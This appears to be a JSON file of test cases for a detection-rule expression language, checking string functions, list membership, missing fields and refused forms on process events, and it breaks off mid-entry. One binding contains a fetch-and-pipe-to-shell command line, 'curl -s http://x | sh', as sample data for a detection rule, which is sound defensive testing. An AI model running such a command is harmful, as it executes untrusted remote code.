[
  {
    "name": "startsWith matches a prefix",
    "kind": "process_event",
    "expression": "event['process.cwd'].startsWith('/tmp/')",
    "bindings": {
      "process.cwd": "/tmp/x"
    },
    "expect": "true"
  },
  {
    "name": "startsWith is not contains",
    "kind": "process_event",
    "expression": "event['process.cwd'].startsWith('/tmp/')",
    "bindings": {
      "process.cwd": "/var/tmp/x"
    },
    "expect": "false"
  },
  {
    "name": "endsWith",
    "kind": "process_event",
    "expression": "event['process.exe'].endsWith('/sh')",
    "bindings": {
      "process.exe": "/usr/bin/sh"
    },
    "expect": "true"
  },
  {
    "name": "contains in a command line",
    "kind": "process_event",
    "expression": "event['process.name'] == 'sh' && event['process.cmdline'].contains('curl')",
    "bindings": {
      "process.name": "sh",
      "process.cmdline": "sh -c curl -s http://x | sh"
    },
    "expect": "true"
  },
  {
    "name": "empty literal matches everything",
    "kind": "process_event",
    "expression": "event['process.cwd'].startsWith('')",
    "bindings": {
      "process.cwd": "/"
    },
    "expect": "true"
  },
  {
    "name": "ancestors list uses in",
    "kind": "process_event",
    "expression": "'nginx' in event['ancestors.names']",
    "bindings": {
      "ancestors.names": [
        "nginx",
        "systemd"
      ]
    },
    "expect": "true"
  },
  {
    "name": "integer uid",
    "kind": "process_event",
    "expression": "event['process.uid'] == 0",
    "bindings": {
      "process.uid": 48
    },
    "expect": "false"
  },
  {
    "name": "an oversized command line is a boolean rules can use",
    "kind": "process_event",
    "expression": "event['process.name'] == 'sh' && event['process.cmdline_truncated']",
    "bindings": {
      "process.name": "sh",
      "process.cmdline_truncated": true
    },
    "expect": "true"
  },
  {
    "name": "missing parent is unavailable",
    "kind": "process_event",
    "expression": "event['parent.name'] == 'nginx'",
    "bindings": {
      "process.name": "sh"
    },
    "expect": "unavailable"
  },
  {
    "name": "functions allowed in snapshot rules",
    "kind": "snapshot",
    "expression": "facts['os.id'].startsWith('fed')",
    "bindings": {
      "os.id": "fedora"
    },
    "expect": "true"
  },
  {
    "name": "non-literal argument refused",
    "kind": "process_event",
    "expression": "event['process.cwd'].startsWith(event['process.name'])",
    "bindings": {
      "process.cwd": "/tmp",
      "process.name": "sh"
    },
    "expect": "refused"
  },
  {
    "name": "list receiver refused",
    "kind": "process_event",
    "expression": "event['ancestors.names'].contains('nginx')",
